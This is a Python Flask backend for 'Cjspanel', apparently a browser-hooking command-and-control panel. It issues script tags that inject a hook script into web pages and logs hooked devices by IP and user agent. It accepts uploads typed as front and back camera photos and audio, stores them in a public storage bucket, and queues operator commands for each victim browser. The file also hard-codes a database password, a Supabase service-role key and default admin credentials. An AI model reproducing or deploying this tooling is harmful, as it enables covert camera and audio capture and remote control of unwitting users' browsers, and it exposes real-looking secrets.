#!/usr/bin/env python3
"""
Cjspanel V1 - Production Ready (Decoupled API)
Supabase + Render Edition
"""
import os
import json
import secrets
import hashlib
from functools import wraps
from flask import Flask, request, jsonify, session, abort
from flask_cors import CORS
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address
from werkzeug.security import generate_password_hash, check_password_hash
import threading
import time
import base64
import uuid
from datetime import datetime, timedelta
import psycopg2
from supabase import create_client, Client

app = Flask(__name__)

# ==================== SECURITY CONFIGURATIONS ====================

# Secret key from environment variable (REQUIRED for production)
app.secret_key = os.environ.get('SECRET_KEY', secrets.token_hex(32))
app.config['SESSION_TYPE'] = 'filesystem'
app.config['SESSION_COOKIE_SECURE'] = True
app.config['SESSION_COOKIE_HTTPONLY'] = True
app.config['SESSION_COOKIE_SAMESITE'] = 'None'  # Needed for cross-domain cookies
app.config['PERMANENT_SESSION_LIFETIME'] = timedelta(hours=24)

# CORS configuration - Allow the Netlify frontend
# In production, replace '*' with your specific Netlify URL
ALLOWED_ORIGINS = os.environ.get('ALLOWED_ORIGINS', 'https://cjspanel.netlify.app').split(',')
CORS(app, origins=ALLOWED_ORIGINS, supports_credentials=True)

# Rate limiting
limiter = Limiter(
    key_func=get_remote_address,
    app=app,
    default_limits=["500 per day", "100 per hour"],
    storage_uri="memory://"
)

# ==================== SUPABASE CONFIGURATION ====================
SUPABASE_URL = os.environ.get('SUPABASE_URL', 'https://jblrvyhjeqsmdxuyjobs.supabase.co')
SUPABASE_KEY = os.environ.get('SUPABASE_SERVICE_ROLE_KEY', 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImpibHJ2eWhqZXFzbWR4dXlqb2JzIiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTc2NzkwMDI2NywiZXhwIjoyMDgzNDc2MjY3fQ.14tKEBa-ujZ12tVuqj9IyQrvutcF6BAf3EA75CrkgiU')
DATABASE_URL = os.environ.get('DATABASE_URL', 'postgresql://postgres:Cjprime%40121212@db.jblrvyhjeqsmdxuyjobs.supabase.co:5432/postgres')
STORAGE_BUCKET = os.environ.get('STORAGE_BUCKET', 'cjspanel-data')

supabase: Client = create_client(SUPABASE_URL, SUPABASE_KEY)

# ==================== DEFAULT CREDENTIALS ====================
DEFAULT_USERNAME = os.environ.get('ADMIN_USERNAME', 'Chetancj')
DEFAULT_PASSWORD = os.environ.get('ADMIN_PASSWORD', 'Chetancj')

# Store active devices
active_devices = {}

# ==================== DATABASE & STORAGE UTILITIES ====================

def get_db_connection():
    """Get a connection to the PostgreSQL database"""
    return psycopg2.connect(DATABASE_URL)

def init_db():
    """Initialize PostgreSQL database with secure schema"""
    try:
        conn = get_db_connection()
        c = conn.cursor()
        
        # Create tables
        c.execute('''CREATE TABLE IF NOT EXISTS devices
                     (id TEXT PRIMARY KEY, 
                      ip TEXT, 
                      user_agent TEXT, 
                      status TEXT DEFAULT 'offline',
                      last_seen TEXT,
                      created_at TEXT)''')
        
        c.execute('''CREATE TABLE IF NOT EXISTS device_data
                     (id SERIAL PRIMARY KEY,
                      device_id TEXT,
                      data_type TEXT,
                      data_content TEXT,
                      file_path TEXT,
                      created_at TEXT)''')
        
        c.execute('''CREATE TABLE IF NOT EXISTS settings
                     (id SERIAL PRIMARY KEY,
                      key TEXT UNIQUE,
                      value TEXT)''')
        
        # Check if settings exist
        c.execute("SELECT value FROM settings WHERE key='password_hash'")
        if not c.fetchone():
            api_key = secrets.token_urlsafe(32)
            c.execute("INSERT INTO settings (key, value) VALUES (%s, %s)", 
                      ('username', DEFAULT_USERNAME))
            c.execute("INSERT INTO settings (key, value) VALUES (%s, %s)", 
                      ('password_hash', generate_password_hash(DEFAULT_PASSWORD)))
            c.execute("INSERT INTO settings (key, value) VALUES (%s, %s)", 
                      ('api_key', api_key))
            print(f"🔑 Initial credentials created. API Key generated.")
        
        conn.commit()
        c.close()
        conn.close()
        print("✅ PostgreSQL database initialized")
    except Exception as e:
        print(f"❌ Database initialization error: {e}")

init_db()

# ==================== SECURITY & HELPER DECORATORS ====================

def login_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if 'logged_in' not in session:
            return jsonify({'error': 'Authentication required'}), 401
        return f(*args, **kwargs)
    return decorated_function

def sanitize_input(value, max_length=1000):
    if value is None: return None
    return str(value)[:max_length].replace('<', '&lt;').replace('>', '&gt;')

# ==================== CORE UTILITY FUNCTIONS ====================

def get_settings():
    conn = get_db_connection()
    c = conn.cursor()
    c.execute("SELECT key, value FROM settings")
    settings = {row[0]: row[1] for row in c.fetchall()}
    c.close()
    conn.close()
    return settings

def update_settings(username, password):
    conn = get_db_connection()
    c = conn.cursor()
    c.execute("UPDATE settings SET value=%s WHERE key='username'", (sanitize_input(username, 50),))
    c.execute("UPDATE settings SET value=%s WHERE key='password_hash'", (generate_password_hash(password),))
    conn.commit()
    c.close()
    conn.close()

def upload_to_supabase(device_id, data_type, content, filename):
    """Upload file content to Supabase Storage"""
    try:
        if content.startswith('data:'):
            header, encoded = content.split(',', 1)
            file_data = base64.b64decode(encoded)
        else:
            file_data = content.encode('utf-8')

        file_path = f"{device_id}/{data_type}/{filename}"
        
        res = supabase.storage.from_(STORAGE_BUCKET).upload(
            path=file_path,
            file=file_data,
            file_options={"content-type": "application/octet-stream"}
        )
        
        # Get public URL
        public_url = supabase.storage.from_(STORAGE_BUCKET).get_public_url(file_path)
        return public_url
    except Exception as e:
        print(f"❌ Supabase Upload Error: {e}")
        return None

def update_device_status(device_id, status="online"):
    conn = get_db_connection()
    c = conn.cursor()
    c.execute("UPDATE devices SET status=%s, last_seen=%s WHERE id=%s", 
              (status, datetime.now().isoformat(), device_id))
    conn.commit()
    c.close()
    conn.close()


@app.route('/')
def index():
    return jsonify({
        'status': 'CJSPANEL API Active',
        'version': '1.0.0',
        'frontend': 'https://cjspanel.netlify.app'
    })

@app.route('/generate_hook')
@login_required
def generate_hook():
    """Generate a unique hook ID and return payload URLs"""
    import random
    import string
    hook_id = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
    base_url = os.environ.get('BASE_URL', request.url_root.rstrip('/'))
    
    hook_url = f"{base_url}/hook/{hook_id}"
    demo_url = f"{base_url}/demo?hook={hook_id}"
    script_tag = f'<script src="{hook_url}"></script>'
    
    return jsonify({
        'hook_id': hook_id,
        'hook_url': hook_url,
        'demo_url': demo_url,
        'script_tag': script_tag
    })

# ==================== API ROUTES ====================

@app.route('/api/login', methods=['POST'])
@limiter.limit("10 per minute")
def login_api():
    data = request.json
    username = sanitize_input(data.get('username'), 50)
    password = data.get('password', '')
    
    settings = get_settings()
    stored_username = settings.get('username', DEFAULT_USERNAME)
    stored_hash = settings.get('password_hash')
    
    if username == stored_username and check_password_hash(stored_hash, password):
        session['logged_in'] = True
        session['username'] = username
        session.permanent = True
        return jsonify({'status': 'success', 'message': 'Authenticated'})
    
    return jsonify({'status': 'error', 'message': 'Invalid credentials'}), 401

@app.route('/api/logout', methods=['POST'])
def logout_api():
    session.clear()
    return jsonify({'status': 'success'})

@app.route('/api/check_auth', methods=['GET'])
def check_auth():
    if 'logged_in' in session:
        return jsonify({'authenticated': True, 'username': session['username']})
    return jsonify({'authenticated': False}), 401

@app.route('/api/devices', methods=['GET'])
@login_required
def get_devices():
    conn = get_db_connection()
    c = conn.cursor()
    c.execute("SELECT * FROM devices ORDER BY created_at DESC")
    columns = [desc[0] for desc in c.description]
    devices = [dict(zip(columns, row)) for row in c.fetchall()]
    c.close()
    conn.close()
    
    # Inject real-time online status
    for device in devices:
        device_id = device['id']
        device['is_active'] = device_id in active_devices and active_devices[device_id].get('online', False)
    
    return jsonify({'devices': devices})

@app.route('/api/stats', methods=['GET'])
@login_required
def get_stats():
    conn = get_db_connection()
    c = conn.cursor()
    c.execute("SELECT COUNT(*) FROM devices")
    total = c.fetchone()[0]
    c.close()
    conn.close()
    
    online_count = sum(1 for d in active_devices.values() if d.get('online', False))
    return jsonify({
        'total': total,
        'online': online_count,
        'offline': total - online_count
    })

@app.route('/api/device/<device_id>/data', methods=['GET'])
@login_required
def get_device_data(device_id):
    conn = get_db_connection()
    c = conn.cursor()
    c.execute("SELECT * FROM device_data WHERE device_id=%s ORDER BY created_at DESC", (device_id,))
    columns = [desc[0] for desc in c.description]
    data = [dict(zip(columns, row)) for row in c.fetchall()]
    c.close()
    conn.close()
    return jsonify({'data': data})

@app.route('/api/delete_device/<device_id>', methods=['DELETE', 'POST'])
@login_required
def delete_device(device_id):
    try:
        uuid.UUID(device_id)
    except ValueError:
        return jsonify({'error': 'Invalid device ID'}), 400
    
    if device_id in active_devices:
        del active_devices[device_id]
    
    conn = get_db_connection()
    c = conn.cursor()
    c.execute("DELETE FROM devices WHERE id=%s", (device_id,))
    c.execute("DELETE FROM device_data WHERE device_id=%s", (device_id,))
    conn.commit()
    c.close()
    conn.close()
    
    # Supabase file deletion (Cleanup)
    try:
        # Note: supabase-py doesn't have a direct "delete folder" but we can list and delete
        files = supabase.storage.from_(STORAGE_BUCKET).list(path=device_id)
        if files:
            for f in files:
                supabase.storage.from_(STORAGE_BUCKET).remove([f"{device_id}/{f['name']}"])
    except: pass
    
    return jsonify({'status': 'success'})

@app.route('/api/clear_database', methods=['POST'])
@login_required
def clear_database():
    active_devices.clear()
    conn = get_db_connection()
    c = conn.cursor()
    c.execute("DELETE FROM devices")
    c.execute("DELETE FROM device_data")
    conn.commit()
    c.close()
    conn.close()
    return jsonify({'status': 'success'})

@app.route('/api/settings', methods=['GET', 'POST'])
@login_required
def settings_api():
    if request.method == 'POST':
        data = request.json
        username = sanitize_input(data.get('username'), 50)
        password = data.get('password')
        if not username or not password or len(password) < 6:
            return jsonify({'error': 'Invalid input'}), 400
        update_settings(username, password)
        return jsonify({'status': 'success'})
    
    settings = get_settings()
    return jsonify({'username': settings.get('username')})

# ==================== PUBLIC HOOK ROUTES ====================

@app.route('/hook/<hook_id>')
@limiter.limit("100 per minute")
def hook_script(hook_id):
    if not hook_id.isalnum() or len(hook_id) != 8: abort(400)
    
    device_id = request.args.get('device_id', str(uuid.uuid4()))
    client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_agent = sanitize_input(request.headers.get('User-Agent', 'Unknown'), 500)

    try:
        conn = get_db_connection()
        c = conn.cursor()
        c.execute("SELECT id FROM devices WHERE id=%s", (device_id,))
        if not c.fetchone():
            c.execute("INSERT INTO devices (id, ip, user_agent, status, last_seen, created_at) VALUES (%s, %s, %s, %s, %s, %s)",
                     (device_id, client_ip, user_agent, 'online', datetime.now().isoformat(), datetime.now().isoformat()))
        else:
            c.execute("UPDATE devices SET status='online', last_seen=%s, ip=%s WHERE id=%s", 
                     (datetime.now().isoformat(), client_ip, device_id))
        conn.commit()
        c.close()
        conn.close()
        
        active_devices[device_id] = {'online': True, 'last_ping': datetime.now(), 'commands': []}
        
        base_url = os.environ.get('BASE_URL', f"{request.scheme}://{request.host}")
        
        # Load hook template and replace markers
        hook_template_path = os.path.join(app.root_path, 'templates', 'hook.js')
        with open(hook_template_path, 'r', encoding='utf-8') as f:
            js_content = f.read()
        
        # Dynamic injection
        js_content = js_content.replace('{{ device_id }}', device_id)
        js_content = js_content.replace('{{ server_url }}', base_url)
        js_content = js_content.replace('{{ hook_id }}', hook_id)
        
        from flask import Response
        return Response(js_content, mimetype='application/javascript')
    except Exception as e:
        print(f"❌ Hook error: {e}")
        return "/* Error */", 500

@app.route('/api/heartbeat', methods=['POST'])
def heartbeat():
    data = request.json
    device_id = data.get('device_id')
    if device_id:
        active_devices[device_id] = {
            'online': True,
            'last_ping': datetime.now(),
            'commands': active_devices.get(device_id, {}).get('commands', [])
        }
        update_device_status(device_id, "online")
    return jsonify({'status': 'ok'})

@app.route('/api/submit_data', methods=['POST'])
def submit_data():
    data = request.json
    device_id = data.get('device_id')
    data_type = sanitize_input(data.get('type'), 50)
    content = data.get('content', '')
    
    if not device_id or not content: return jsonify({'error': 'Missing data'}), 400
    
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    ext = {'photo_front': 'jpg', 'photo_back': 'jpg', 'audio': 'wav'}.get(data_type, 'txt')
    filename = f"{data_type}_{timestamp}.{ext}"
    
    file_url = upload_to_supabase(device_id, data_type, content, filename)
    
    conn = get_db_connection()
    c = conn.cursor()
    c.execute("INSERT INTO device_data (device_id, data_type, data_content, file_path, created_at) VALUES (%s, %s, %s, %s, %s)",
             (device_id, data_type, content[:100], file_url, datetime.now().isoformat()))
    conn.commit()
    c.close()
    conn.close()
    
    return jsonify({'status': 'success', 'url': file_url})

@app.route('/api/check_commands/<device_id>')
def check_commands(device_id):
    if device_id in active_devices:
        commands = active_devices[device_id].get('commands', [])
        active_devices[device_id]['commands'] = []
        return jsonify({'commands': commands})
    return jsonify({'commands': []})

@app.route('/api/execute_command', methods=['POST'])
@login_required
def execute_command():
    data = request.json
    device_id = data.get('device_id')
    command = sanitize_input(data.get('command'), 100)
    
    if device_id in active_devices:
        active_devices[device_id]['commands'].append(command)
        return jsonify({'status': 'success'})
    return jsonify({'status': 'error', 'message': 'Device offline'}), 400

# ==================== BACKGROUND TASKS ====================

def cleanup_old_devices():
    while True:
        time.sleep(30)
        now = datetime.now()
        for d_id in list(active_devices.keys()):
            last = active_devices[d_id].get('last_ping')
            if last and (now - last).seconds > 60:
                active_devices[d_id]['online'] = False
                update_device_status(d_id, "offline")

threading.Thread(target=cleanup_old_devices, daemon=True).start()

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
